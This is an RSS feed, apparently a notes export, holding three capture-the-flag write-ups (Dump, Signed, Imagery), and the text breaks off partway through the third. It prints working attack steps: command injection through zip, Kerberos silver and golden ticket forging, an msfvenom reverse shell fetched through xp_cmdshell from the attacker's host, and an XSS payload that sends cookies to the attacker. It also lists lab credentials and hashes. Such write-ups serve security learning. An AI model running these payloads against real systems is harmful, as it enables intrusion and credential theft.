@@ -1,0 +1,1384 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+    <channel>
+        <title></title>
+        <link>undefined</link>
+        <description>undefined</description>
+        <lastBuildDate>Sat, 28 Feb 2026 18:37:43 GMT</lastBuildDate>
+        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
+        <generator>Joplin Pages Publisher</generator>
+        <item>
+            <title><![CDATA[Linux - Hard - Dump]]></title>
+            <guid>c946125ff2ac456c813c8eebead13cdb</guid>
+            <pubDate>Sat, 28 Feb 2026 11:57:39 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="recon">Recon</h1>
+<p>Not much recon, we just go with the webapp.<br />
+<img src="/_resources/6e2d6c18932044ed8541a8b065cb74e4.png" /></p>
+<p>We can create new account on the site to get in.s<br />
+<img src="/_resources/d66895eb70304ffe964d3fcbe5400026.png" /></p>
+<p>Trying to create another account with the same name gives us explicit sql error, which suggests that we might use sqli in this box.<br />
+<img src="/_resources/4243858c6c564e62bb6b62398551a1b1.png" /></p>
+<p>After loggin in, we get a ctf custom site for packet capture.<br />
+<img src="/_resources/50486cce33c6480dbb4c28150219fc56.png" /></p>
+<h1 id="downloading-some-packets">Downloading some packets</h1>
+<p>We can walk around the site a bit to discover all of the functionality.<br />
+<img src="/_resources/e3791650f1d84fd39030ecdeb70dc6cf.png" /></p>
+<p>When trying to download files, we can see that the response from the server is nonstandard.<br />
+<img src="/_resources/957c7348b28e4002a80c0f9bb3443b45.png" /></p>
+<p>Trying to export nothing reveals the path where the zip files are beign stored on the machine.<br />
+<img src="/_resources/e8eed1dc54b94e07b12dd3d442365aa4.png" /></p>
+<p>We can also upload arbitrary files, but none of them can be seen.<br />
+<img src="/_resources/056ce6c197394826998a90aeadbfa851.png" /></p>
+<p><img src="/_resources/df6167545b354b218d0efc356acabb6d.png" /></p>
+<p>It’s expected, as if we test viewing the uuid4 files, they error out anyways.<br />
+<img src="/_resources/c8251925d3944c93bc7e15203723e744.png" /></p>
+<p>What’s interesting, is that we can download our uploaded files.<br />
+<img src="/_resources/ce3504d302244fe988afdf4998fb1a2b.png" /></p>
+<p>We can test if there is proper name validation.<br />
+<img src="/_resources/11c26c60d43a4850874074cf1516c3cb.png" /></p>
+<p>We can see that we can suscessfuly influence executed command.<br />
+<img src="/_resources/e83b24fef10a4005b24389d838bf9105.png" /></p>
+<p>Unfortunetly passing a semicollon does not seem to terminate the command.<br />
+<img src="/_resources/d79067168a854b5aacd5e049393a01e2.png" /></p>
+<p>Looking at man for zip, we can find cmd execution.<br />
+<img src="/_resources/272578eef5b842a8946bdbb8e0f316a4.png" /></p>
+<p>Sending all of the flags at once causes some parsing error.<br />
+<img src="/_resources/38b16287334b4a81ba2cc79eadb11bed.png" /></p>
+<p>Sending it as separate files works. Running with -TT passes name of the zip file to the command given in as a param, that is why we see whoami error message.<br />
+<img src="/_resources/5932b1d1733d41c18e9d7c69f08340d2.png" /></p>
+<p><img src="/_resources/e909c2d6a45e4bc2ba50c1c0ee1f86c5.png" /></p>
+<p>I tried for a while to put as a filename revshell, but there where multiple syntax issues. All of this can be bypassed, if we download the file first as part of the command and then execute it from a file.<br />
+<img src="/_resources/92c16872a4f04f75b6ef84963091662c.png" /></p>
+<p>It was also crashing when trying to add any path to the server. Also, adding -nd is neccessary, so it is not stored in a separate directory.<br />
+<img src="/_resources/e52526fd601f4c6d806b72929695a549.png" /></p>
+<p>Finaly working version:<br />
+<img src="/_resources/7afcb8ed02f94580a4590d36d86cdf99.png" /></p>
+<p><img src="/_resources/4bd3c22db52d452897d272aeb27ffb6c.png" /></p>
+<p><img src="/_resources/6152825904444944b113aad1fb1cf5e2.png" /></p>
+<p><img src="/_resources/6dab4e25b685423b9ae87179c9079a1c.png" /></p>
+<p>We get a shell as www-data. On entrance we can get a databse with passwords that are not hashed.</p>
+<p><img src="/_resources/895d03608fd14347b32c4b0f97ff22e1.png" /></p>
+<p><code>fritz:Passw0rdH4shingIsforNoobZ!</code></p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>Fritz doesnt seem to have any interesting options.<br />
+<img src="/_resources/f1dd388618c441a09f2ce780646d860c.png" /></p>
+<p>Going back to www-data, we can see that for some reason it has sudo enabled.<br />
+<img src="/_resources/f8db4ee769da4c71a24a63345ed46176.png" /></p>
+<p><a title="https://gtfobins.org/gtfobins/tcpdump/#sudo" href="https://gtfobins.org/gtfobins/tcpdump/#sudo">Gtfo-bins</a> have a page dedicated to tcpdump. We cant use it like on the site, as we need to match the regex.<br />
+<img src="/_resources/1ed66f3ca60c4c09811a0b6bef6fb50a.png" /></p>
+<p>File execution is not allowed for some reason,  even though we are running with sudo. It is pressumably being blocked by selinux.<br />
+<img src="/_resources/b04a3fad6300489c86061a244c72c98e.png" /></p>
+<p>We can check permissions set in apparmor in <code>/etc/apparmor.d</code>. We can see that -Z flag allows us to only use gzip.</p>
+<div><pre class="hljs"><code>  <span class="hljs-comment"># for -z</span>
+  <span class="hljs-regexp">/{usr/</span>,}bin/gzip ixr,
+  <span class="hljs-regexp">/{usr/</span>,}bin/bzip2 ixr,</code></pre></div>
+<p><img src="/_resources/af84d0f397ba44b7adc967b51cd15ab0.png" /></p>
+<p>Orginaly I planned to abuse symlinks somehow, but root can be achived using motd. For some reason, motd on linux runs as root and runs scripts contained in <code>/etc/update-motd.d</code> folder.<br />
+<img src="/_resources/dd186f8d1e324300913940fe73d3c691.png" /></p>
+<p>We can use then tcpdump to create a file in this directory, one that we will have write permissions to as fritz.<br />
+<img src="/_resources/9b965afb57a14877a610e62a5db048bc.png" /></p>
+<p><img src="/_resources/26f87f67638d48869d221488d8170be8.png" /></p>
+<p>This finally gfives us the flag after another login, if we add <code>cat /root/root.txt</code> to the motd and make it executable.<br />
+<img src="/_resources/88b036ba91f74e7d8bbbc6bc37bbd1b5.png" /></p>
+<p>To get proper root access we can copy the shell to home folder with suid flag or add ourselves to the sudoers file.<br />
+<code>cp /usr/bin/bash /home/fritz/bash &amp;&amp; chmod u+s /home/fritz/bash</code></p>
+<p><img src="/_resources/26725caacaef4435af52d1fd1dc9d545.png" /></p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Medium - Windows - Signed]]></title>
+            <guid>d03f09f25b0d4aceb6351fdc1799abfc</guid>
+            <pubDate>Sun, 12 Oct 2025 10:37:14 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="recon">Recon</h1>
+<p>“As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH”, so we get to login using <code>impacket-mssqlclient 'signed.htb/scott:Sm230#C5NatH@10.129.66.12'</code>. We can do a quick nmap scan to learn more about the service.</p>
+<div><pre class="hljs"><code><span class="hljs-string">nmap</span> <span class="hljs-string">--script</span> <span class="hljs-string">ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes</span> <span class="hljs-string">--script-args</span> <span class="hljs-string">mssql.instance-port=1433,mssql.username=scott,mssql.password=Sm230#C5NatH,mssql.instance-name=MSSQLSERVER</span> <span class="hljs-string">-sV</span> <span class="hljs-string">-p</span> <span class="hljs-number">1433 </span><span class="hljs-number">10.129</span><span class="hljs-number">.66</span><span class="hljs-number">.12</span>
+<span class="hljs-string">Starting</span> <span class="hljs-string">Nmap</span> <span class="hljs-number">7.95</span> <span class="hljs-string">(</span> <span class="hljs-string">https://nmap.org</span> <span class="hljs-string">)</span> <span class="hljs-string">at</span> <span class="hljs-number">2025-10-12 </span><span class="hljs-number">15</span><span class="hljs-string">:16</span> <span class="hljs-string">BST</span>
+<span class="hljs-string">Nmap</span> <span class="hljs-string">scan</span> <span class="hljs-string">report</span> <span class="hljs-string">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.66</span><span class="hljs-number">.12</span>
+<span class="hljs-string">Host</span> <span class="hljs-string">is</span> <span class="hljs-string">up</span> <span class="hljs-string">(0.035s</span> <span class="hljs-string">latency).</span>
+
+<span class="hljs-attr">Bug in ms-sql-dac:</span> <span class="hljs-literal">no</span> <span class="hljs-string">string</span> <span class="hljs-string">output.</span>
+<span class="hljs-string">PORT</span>     <span class="hljs-string">STATE</span> <span class="hljs-string">SERVICE</span>  <span class="hljs-string">VERSION</span>
+<span class="hljs-number">1433</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">ms-sql-s</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">SQL</span> <span class="hljs-string">Server</span> <span class="hljs-number">2022 </span><span class="hljs-number">16.00</span><span class="hljs-number">.1000</span><span class="hljs-number">.00</span><span class="hljs-string">;</span> <span class="hljs-string">RTM</span>
+<span class="hljs-string">|_ms-sql-config:</span> <span class="hljs-attr">ERROR:</span> <span class="hljs-string">Script</span> <span class="hljs-string">execution</span> <span class="hljs-string">failed</span> <span class="hljs-string">(use</span> <span class="hljs-string">-d</span> <span class="hljs-string">to</span> <span class="hljs-string">debug)</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ms-sql-info:</span> 
+<span class="hljs-string">|</span>   <span class="hljs-attr">10.129.66.12:1433:</span> 
+<span class="hljs-string">|</span>     <span class="hljs-attr">Version:</span> 
+<span class="hljs-string">|</span>       <span class="hljs-attr">name:</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">SQL</span> <span class="hljs-string">Server</span> <span class="hljs-number">2022 </span><span class="hljs-string">RTM</span>
+<span class="hljs-string">|</span>       <span class="hljs-attr">number:</span> <span class="hljs-number">16.00</span><span class="hljs-number">.1000</span><span class="hljs-number">.00</span>
+<span class="hljs-string">|</span>       <span class="hljs-attr">Product:</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">SQL</span> <span class="hljs-string">Server</span> <span class="hljs-number">2022</span>
+<span class="hljs-string">|</span>       <span class="hljs-attr">Service pack level:</span> <span class="hljs-string">RTM</span>
+<span class="hljs-string">|</span>       <span class="hljs-attr">Post-SP patches applied:</span> <span class="hljs-literal">false</span>
+<span class="hljs-string">|_</span>    <span class="hljs-attr">TCP port:</span> <span class="hljs-number">1433</span>
+<span class="hljs-string">|_ms-sql-hasdbaccess:</span> <span class="hljs-attr">ERROR:</span> <span class="hljs-string">Script</span> <span class="hljs-string">execution</span> <span class="hljs-string">failed</span> <span class="hljs-string">(use</span> <span class="hljs-string">-d</span> <span class="hljs-string">to</span> <span class="hljs-string">debug)</span>
+<span class="hljs-string">|_ms-sql-tables:</span> <span class="hljs-attr">ERROR:</span> <span class="hljs-string">Script</span> <span class="hljs-string">execution</span> <span class="hljs-string">failed</span> <span class="hljs-string">(use</span> <span class="hljs-string">-d</span> <span class="hljs-string">to</span> <span class="hljs-string">debug)</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ms-sql-xp-cmdshell:</span> 
+<span class="hljs-string">|_</span>  <span class="hljs-string">(Use</span> <span class="hljs-string">--script-args=ms-sql-xp-cmdshell.cmd='&lt;CMD&gt;'</span> <span class="hljs-string">to</span> <span class="hljs-string">change</span> <span class="hljs-string">command.)</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ms-sql-dump-hashes:</span> 
+<span class="hljs-string">|</span>   <span class="hljs-attr">10.129.66.12:1433:</span> 
+<span class="hljs-string">|</span>     <span class="hljs-string">sa:Null</span>
+<span class="hljs-string">|_</span>    <span class="hljs-string">scott:Null</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ms-sql-empty-password:</span> 
+<span class="hljs-string">|_</span>  <span class="hljs-attr">10.129.66.12:1433:</span> 
+<span class="hljs-string">|</span> <span class="hljs-attr">ms-sql-ntlm-info:</span> 
+<span class="hljs-string">|</span>   <span class="hljs-attr">10.129.66.12:1433:</span> 
+<span class="hljs-string">|</span>     <span class="hljs-attr">Target_Name:</span> <span class="hljs-string">SIGNED</span>
+<span class="hljs-string">|</span>     <span class="hljs-attr">NetBIOS_Domain_Name:</span> <span class="hljs-string">SIGNED</span>
+<span class="hljs-string">|</span>     <span class="hljs-attr">NetBIOS_Computer_Name:</span> <span class="hljs-string">DC01</span>
+<span class="hljs-string">|</span>     <span class="hljs-attr">DNS_Domain_Name:</span> <span class="hljs-string">SIGNED.HTB</span>
+<span class="hljs-string">|</span>     <span class="hljs-attr">DNS_Computer_Name:</span> <span class="hljs-string">DC01.SIGNED.HTB</span>
+<span class="hljs-string">|</span>     <span class="hljs-attr">DNS_Tree_Name:</span> <span class="hljs-string">SIGNED.HTB</span>
+<span class="hljs-string">|_</span>    <span class="hljs-attr">Product_Version:</span> <span class="hljs-number">10.0</span><span class="hljs-number">.17763</span></code></pre></div>
+<p>Looking online, we can find CVE-2024-37334, but no POC.</p>
+<div><pre class="hljs"><code><span class="hljs-selector-tag">SQL</span> (scott  guest<span class="hljs-variable">@master</span>)&gt; <span class="hljs-selector-tag">SELECT</span> <span class="hljs-selector-tag">name</span> <span class="hljs-selector-tag">FROM</span> <span class="hljs-selector-tag">sys</span><span class="hljs-selector-class">.databases</span>;
+
+<span class="hljs-selector-tag">master</span>   
+<span class="hljs-selector-tag">tempdb</span>  
+<span class="hljs-selector-tag">model</span>    
+<span class="hljs-selector-tag">msdb</span>     </code></pre></div>
+<div><pre class="hljs"><code>┌──(kali㉿kali)-[/home/kali/PowerUpSQL]
+└─PS&gt; Get-SQLServerInfo -Instance <span class="hljs-string">"10.129.66.12"</span> -Username <span class="hljs-string">"scott"</span> -Password <span class="hljs-string">"Sm230#C5NatH"</span>
+
+ComputerName           : 10.129.66.12
+Instance               : <span class="hljs-type">DC01</span>
+DomainName             : <span class="hljs-type">SIGNED</span>
+ServiceProcessID       : 888
+ServiceName            : <span class="hljs-type">MSSQLSERVER</span>
+ServiceAccount         : <span class="hljs-type">SIGNED</span>\mssqlsvc
+AuthenticationMode     : <span class="hljs-type">Windows</span> <span class="hljs-keyword">and</span> SQL Server Authentication
+ForcedEncryption       : 0
+Clustered              : <span class="hljs-type">No</span>
+SQLServerVersionNumber : 16.0.1000.6
+SQLServerMajorVersion  : 2022
+SQLServerEdition       : <span class="hljs-type">Enterprise</span> Evaluation Edition (<span class="hljs-number">64</span>-bit)
+SQLServerServicePack   : <span class="hljs-type">RTM</span>
+OSArchitecture         : <span class="hljs-type">X64</span>
+OsVersionNumber        : <span class="hljs-type">SQL</span>
+Currentlogin           : <span class="hljs-type">scott</span>
+IsSysadmin             : <span class="hljs-type">No</span>
+ActiveSessions         : 1</code></pre></div>
+<p>The service account is different than the user we logged in as. We can run <code>responder -I tun0</code> and try to execute <code>xp_dirtree</code> against it and crack the hash using john.</p>
+<div><pre class="hljs"><code><span class="hljs-string">SQL</span> <span class="hljs-string">(scott</span>  <span class="hljs-string">guest@master)&gt;</span> <span class="hljs-string">xp_dirtree</span> <span class="hljs-string">\\&lt;ip&gt;\thissharedoesntexist</span>
+
+<span class="hljs-meta">---
+</span>
+<span class="hljs-string">┌──(kali㉿kali)-[~]</span>
+<span class="hljs-string">└─$</span> <span class="hljs-string">sudo</span> <span class="hljs-string">responder</span> <span class="hljs-string">-I</span> <span class="hljs-string">tun0</span>
+[<span class="hljs-string">SMB</span>] <span class="hljs-attr">NTLMv2-SSP Client   :</span> <span class="hljs-number">10.129</span><span class="hljs-number">.66</span><span class="hljs-number">.12</span>
+[<span class="hljs-string">SMB</span>] <span class="hljs-attr">NTLMv2-SSP Username :</span> <span class="hljs-string">SIGNED\mssqlsvc</span>
+[<span class="hljs-string">SMB</span>] <span class="hljs-attr">NTLMv2-SSP Hash     :</span> <span class="hljs-string">mssqlsvc::SIGNED:650c1aad4a692032:E5302536320D71D5B5F435698F28BC9A:010100000000000000FD1EB8853BDC0192F4AE5975C9A5DC0000000002000800370034004B004F0001001E00570049004E002D00380039004D004D00530031005A004A0057003300390004003400570049004E002D00380039004D004D00530031005A004A005700330039002E00370034004B004F002E004C004F00430041004C0003001400370034004B004F002E004C004F00430041004C0005001400370034004B004F002E004C004F00430041004C000700080000FD1EB8853BDC0106000400020000000800300030000000000000000000000000300000319EE653B160B28341C3ED4C355F4C30C500A5FDC80C37A5B308A91448C2B9F00A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370031000000000000000000</span></code></pre></div>
+<p>We then get to crack the hash.</p>
+<div><pre class="hljs"><code>┌──(kali㉿kali)-[~]
+└─$ sudo john --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt hash.txt
+Will run <span class="hljs-number">8</span> OpenMP threads
+Press <span class="hljs-string">'q'</span> or Ctrl-C to abort, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status
+purPLE9795!@     (mssqlsvc)    </code></pre></div>
+<p>Later we can find all of the admins on this mssql.</p>
+<div><pre class="hljs"><code>impacket-mssqlclient 'signed.htb/mssqlsvc:purPLE9795!@@10.129.66.12' -windows-auth -command "<span class="hljs-keyword">SELECT</span> r.name <span class="hljs-keyword">AS</span> <span class="hljs-keyword">role</span>, m.name <span class="hljs-keyword">AS</span> member <span class="hljs-keyword">FROM</span> sys.server_principals r <span class="hljs-keyword">JOIN</span> sys.server_role_members rm <span class="hljs-keyword">ON</span> r.principal_id=rm.role_principal_id <span class="hljs-keyword">JOIN</span> sys.server_principals m <span class="hljs-keyword">ON</span> rm.member_principal_id=m.principal_id <span class="hljs-keyword">WHERE</span> r.name=<span class="hljs-string">'sysadmin'</span>;" 
+
+
+role       member                      
+--------   -------------------------   
+sysadmin   sa                          
+sysadmin   SIGNED\IT                   
+sysadmin   NT SERVICE\SQLWriter        
+sysadmin   NT SERVICE\Winmgmt          
+sysadmin   NT SERVICE\MSSQLSERVER      
+sysadmin   NT SERVICE\SQLSERVERAGENT   </code></pre></div>
+<p>We can also get domain sid with <code>SELECT name, sid FROM sys.server_principals WHERE sid IS NOT NULL AND name LIKE 'SIGNED%';</code> and gain a silver ticket with ticketer. To get it, it’s required that (WITHOUT CHATGPT) you get domain sid and password hash.</p>
+<div><pre class="hljs"><code><span class="hljs-attribute">impacket</span>-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">4088429403</span>-<span class="hljs-number">1159899800</span>-<span class="hljs-number">2753317549</span> -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:<span class="hljs-number">1433</span> -groups <span class="hljs-number">1105</span> -user-id <span class="hljs-number">1103</span> mssqlsvc</code></pre></div>
+<p>Then it’s possible to login using <code>export KRB5CCNAME=mssqlsvc.ccache &amp;&amp; impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB</code> and finally enable powershell using <code>enable_xp_cmdshell</code> and <code>RECONFIGURE;</code>.</p>
+<div><pre class="hljs"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.22 LPORT=2137 -f exe &gt; shell-x64.exe
+sudo http-server -p 80           
+<span class="hljs-section">...and catch with metasploit
+---</span>
+
+xp<span class="hljs-emphasis">_cmdshell "powershell wget -UseBasicParsing http://10.10.15.22/shell-x64.exe -OutFile %temp%/shell-x64.exe"
+xp_</span>cmdshell "%temp%\\shell-x64.exe -nv 10.10.15.22 4444 -e cmd.exe"</code></pre></div>
+<p>and we finaly get user flag with <code>cat /Users/mssqlsvc/Desktop/user.txt</code></p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>We continue signed, by signing more tickets. Time for the golden ticket. To get it, one of these two sids are needed.</p>
+<div><pre class="hljs"><code>PS C:\Windows\system32&gt; <span class="hljs-keyword">Get</span>-ADGroup "Domain Admins" | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">Object</span> <span class="hljs-type">Name</span>, SID
+<span class="hljs-keyword">Get</span>-ADGroup "Domain Admins" | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">Object</span> <span class="hljs-type">Name</span>, SID
+
+<span class="hljs-type">Name</span>          SID                                          
+<span class="hljs-comment">----          ---                                          </span>
+<span class="hljs-keyword">Domain</span> Admins S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-4088429403</span><span class="hljs-number">-1159899800</span><span class="hljs-number">-2753317549</span><span class="hljs-number">-512</span>
+
+
+PS C:\Windows\system32&gt; <span class="hljs-keyword">Get</span>-ADGroup "Enterprise Admins" | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">Object</span> <span class="hljs-type">Name</span>, SID
+<span class="hljs-keyword">Get</span>-ADGroup "Enterprise Admins" | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">Object</span> <span class="hljs-type">Name</span>, SID
+
+<span class="hljs-type">Name</span>              SID                                          
+<span class="hljs-comment">----              ---                                          </span>
+Enterprise Admins S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-4088429403</span><span class="hljs-number">-1159899800</span><span class="hljs-number">-2753317549</span><span class="hljs-number">-519</span>
+
+<span class="hljs-comment">---</span>
+
+impacket-ticketer -nthash EF699384C3285C54128A3EE1DDB1A0CC -<span class="hljs-keyword">domain</span>-sid S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-4088429403</span><span class="hljs-number">-1159899800</span><span class="hljs-number">-2753317549</span> -<span class="hljs-keyword">domain</span> SIGNED.HTB -spn MSSQLSvc/DC01.SIGNED.HTB -<span class="hljs-keyword">groups</span> <span class="hljs-number">512</span>,<span class="hljs-number">519</span>,<span class="hljs-number">1105</span> -<span class="hljs-keyword">user</span>-id <span class="hljs-number">1103</span> mssqlsvc
+
+export KRB5CCNAME=mssqlsvc.ccache &amp;&amp; impacket-mssqlclient -k -<span class="hljs-keyword">no</span>-pass DC01.SIGNED.HTB</code></pre></div>
+<p>Then we can enable data access and grab the flag.</p>
+<div><pre class="hljs"><code><span class="hljs-built_in">EXEC</span> sp_configure <span class="hljs-string">'show advanced options'</span>, <span class="hljs-number">1</span>;
+RECONFIGURE;
+<span class="hljs-built_in">EXEC</span> sp_configure <span class="hljs-string">'Ad Hoc Distributed Queries'</span>, <span class="hljs-number">1</span>;
+RECONFIGURE;
+<span class="hljs-built_in">SELECT</span> * <span class="hljs-keyword">FROM</span> OPENROWSET(BULK <span class="hljs-string">'C:\Users\Administrator\Desktop\root.txt'</span>,SINGLE_CLOB) AS x;</code></pre></div>
+<p>To properly own the machine, password and username of admin can be found in powershell history.<br />
+<code>SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt',SINGLE_CLOB) AS x;</code></p>
+<p>Then we can upload and run RunasCs.exe to gain privilaged shell<br />
+<code>.\RunasCs.exe Administrator Th1s889Rabb!t powershell.exe -r ip 2138</code></p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Linux - Medium - Imagery]]></title>
+            <guid>9fa48a9e87b840a0abc4b8b9e064134a</guid>
+            <pubDate>Sun, 28 Sep 2025 11:06:50 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="recon">Recon</h1>
+<div><pre class="hljs"><code>PORT     STATE SERVICE VERSION
+<span class="hljs-number">22</span>/tcp   open  ssh     OpenSSH <span class="hljs-number">9.7</span>p<span class="hljs-number">1</span> Ubuntu <span class="hljs-number">7</span>ubuntu<span class="hljs-number">4.3</span> (Ubuntu Linux<span class="hljs-comment">; protocol 2.0)</span>
+| ssh-hostkey: 
+|   <span class="hljs-number">256</span> <span class="hljs-number">35</span>:<span class="hljs-number">94</span>:fb:<span class="hljs-number">70</span>:<span class="hljs-number">36</span>:<span class="hljs-number">1</span>a:<span class="hljs-number">26</span>:<span class="hljs-number">3</span><span class="hljs-keyword">c</span>:a<span class="hljs-number">8</span>:<span class="hljs-number">3</span><span class="hljs-keyword">c</span>:<span class="hljs-number">5</span>a:<span class="hljs-number">5</span>a:e<span class="hljs-number">4</span>:fb:<span class="hljs-number">8</span><span class="hljs-keyword">c</span>:<span class="hljs-number">18</span> (ECDSA)
+|_  <span class="hljs-number">256</span> <span class="hljs-keyword">c</span><span class="hljs-number">2</span>:<span class="hljs-number">52</span>:<span class="hljs-number">7</span><span class="hljs-keyword">c</span>:<span class="hljs-number">42</span>:<span class="hljs-number">61</span>:ce:<span class="hljs-number">97</span>:<span class="hljs-number">9</span>d:<span class="hljs-number">12</span>:d<span class="hljs-number">5</span>:<span class="hljs-number">01</span>:<span class="hljs-number">1</span><span class="hljs-keyword">c</span>:ba:<span class="hljs-number">68</span>:<span class="hljs-number">0</span>f:fa (ED<span class="hljs-number">25519</span>)
+<span class="hljs-number">8000</span>/tcp open  http    Werkzeug httpd <span class="hljs-number">3.1</span>.<span class="hljs-number">3</span> (Python <span class="hljs-number">3.12</span>.<span class="hljs-number">7</span>)
+|_http-title: Image Gallery
+|_http-server-header: Werkzeug/<span class="hljs-number">3.1</span>.<span class="hljs-number">3</span> Python/<span class="hljs-number">3.12</span>.<span class="hljs-number">7</span>
+Device <span class="hljs-keyword">type</span>: general purpose</code></pre></div>
+<p><img src="/_resources/90fc2ea6e02b4bdb9adeb77834e95254.png" /></p>
+<p>We can create an account and gain access to the upload image panel.</p>
+<p><img src="/_resources/e77ce262bbf1426eba34fd564e4b1692.png" /></p>
+<p>We can test it for a while but the site checks for any php extensions and the files are being downloaded by accessing the /images site all at once, with completly randomized names. This didnt seem like the way to get in.</p>
+<p><img src="/_resources/a86638c4fe1946a3af7fcbf018ba3b73.png" /></p>
+<p>Going back to the main site, we can see that there is also a report bug site.</p>
+<p><img src="/_resources/bd2a8b09f5a04c9a91385f60f0969a31.png" /></p>
+<p>We can try out the classic xss with <code>&lt;img src=1 onerror="document.location='http://&lt;ip&gt;/xss/'+ document.cookie"&gt;</code> and get the cookie back.</p>
+<p><img src="/_resources/9bc9ab12df5440909e94d85d84148280.png" /></p>
+<p>We can then replace our cookie with admin one…</p>
+<p><img src="/_resources/53246329c1f84dbbaec37611fe51db47.png" /></p>
+<p>…and gain access to the admin panel.</p>
+<p><img src="/_resources/c4bc4dacfeb24f76a8985fd4692fc57b.png" /></p>
+<h1 id="admin-panel">Admin panel</h1>
+<p>The first feature that should catch eye is “Download log”. Not because we are interested in the logs itself, but admin panel is usualy less secure and such features allow for LFI. The url structure suggests that it could be possible.</p>
+<p><img src="/_resources/48b579d0a02f4c56a3b2c00e23228a3d.png" /></p>
+<p>As hoped, it works.</p>
+<p><img src="/_resources/4e40db5c757245cab412d8b670e2e8e8.png" /></p>
+<p>Important users are mark, web and root. It’s probably not containred.</p>
+<div><pre class="hljs"><code><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span>
+<span class="hljs-symbol">web:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/web</span><span class="hljs-symbol">:/bin/bash</span>
+<span class="hljs-symbol">mark:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1002</span><span class="hljs-symbol">:</span><span class="hljs-number">1002</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/mark</span><span class="hljs-symbol">:/bin/bash</span></code></pre></div>
+<p>Unfortunetly the site is being hosted as user <code>web</code> so we can’t just grab <code>/home/mark/.ssh/id_rsa</code>. By guessing we can find /home/web/web/app.py. Reading it leads us to utils.py, then to config.py and then to db.json. This finaly gives us password hashes.</p>
+<div><pre class="hljs"><code><span class="hljs-attr">"users"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+    <span class="hljs-punctuation">{</span>
+        <span class="hljs-attr">"username"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"admin@imagery.htb"</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"password"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"5d9c1d507a3f76af1e5c97a3ad1eaa31"</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"isAdmin"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"displayId"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"a1b2c3d4"</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"login_attempts"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"isTestuser"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">false</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"failed_login_attempts"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"locked_until"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">null</span>
+    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-punctuation">{</span>
+        <span class="hljs-attr">"username"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"testuser@imagery.htb"</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"password"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2c65c8d7bfbca32a3ed42596192384f6"</span><span class="hljs-punctuation">,</span>
